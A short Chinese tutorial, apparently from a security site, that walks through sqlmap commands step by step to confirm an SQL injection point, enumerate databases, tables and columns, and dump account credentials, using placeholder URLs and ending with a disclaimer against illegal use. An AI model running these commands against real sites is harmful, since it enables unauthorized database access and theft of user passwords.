## 一次sqlmap注入点并且dump出账号密码全程

判断注入点:sqlmap.py -u “存在注入url”

爆出所有数据库名字:sqlmap.py -u “存在注入url” --dbs

查看当前使用账号:sqlmap.py -u “存在注入url” --current-user

### 1、查看当前数据库:sqlmap.py -u “存在注入url” --current-db

###
![](https://image.3001.net/images/20200908/1599570836.png!small)![](https://image.3001.net/images/20200908/1599570844.png!small)2、列出数据库中所有表:sqlmap.py
-u “存在注入url”-D “当前数据库名”
--tables。解释说明:-D是指定数据库名称。![](https://image.3001.net/images/20200908/1599570861.png!small)![](https://image.3001.net/images/20200908/1599570873.png!small)3、列出数据库中的表中的字段:sqlmap.py
-u “存在注入url” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)”
--columns。![](https://image.3001.net/images/20200908/1599570908.png!small)![](https://image.3001.net/images/20200908/1599570896.png!small)4、列出数据库中的表中的字段:sqlmap.py
-u “存在注入url” -D “当前数据库名” -T “数据库中的随意一张表(选取表需要自己判断)” -C “当前表的字段” --dump。

![](https://image.3001.net/images/20200908/1599570941.png!small)![](https://image.3001.net/images/20200908/1599570951.png!small)
**免责声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。禁止任何人转载到其他站点，禁止用于任何非法用途。如有任何人凭此做何非法事情，均于笔者无关，特此声明。**

